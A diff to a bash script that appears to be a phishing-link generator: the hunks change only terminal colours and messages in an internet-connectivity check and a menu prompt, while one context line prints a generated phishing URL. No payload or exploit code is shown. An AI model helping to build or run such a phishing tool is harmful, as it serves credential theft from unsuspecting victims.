@@ -7,22 +7,21 @@ echo -e "\e[31m                [\e[32m★\e[31m]\e[93m Follow us on youtube:bhav
 echo -e "\e[32m                ============================================\e[m " 
 # check the internet connectivity 
 connection() {
-echo
 while :
 do
 if curl -s --head  --request GET www.google.com | grep "200 OK" > /dev/null ; then
-    echo -e "\e[32m-->> Active Internet Connection\e[m"
+    echo -e "\e[92m-->> Active Internet Connection\e[m"
     echo 
     sleep 1
-    echo -e "\e[32m-->> READY TO GO.........\e[m"
+    echo -e "\e[92m-->> READY TO GO...\e[m"
     sleep 2
     echo
     break
 else
-    echo -e "\e[31m-->> Inactive Internet Connection\e[m"
+    echo -e "\e[91m-->> Inactive Internet Connection\e[m"
     sleep 1
     echo
-    echo -e "\e[33m-->> Check your connection and Try Again!!\e[m"
+    echo -e "\e[93m-->> Check your connection and Try Again!!\e[m"
     sleep 2
     echo
     exit
@@ -127,7 +126,7 @@ ash() {
         echo -e "\e[31m[\e[32m*\e[31m]\e[32m Your phishing url >>\e[m $final "
         }
 
-        read -p $'\e[31m[\e[32m*\e[31m]\e[32m Enter Your Choice : \e[0m' option
+        read -p $'\e[31m[\e[32m*\e[31m]\e[93m Enter Your Choice : \e[0m' option
 	
          if [ $option = 01 ] || [ $option = 1 ]
          then
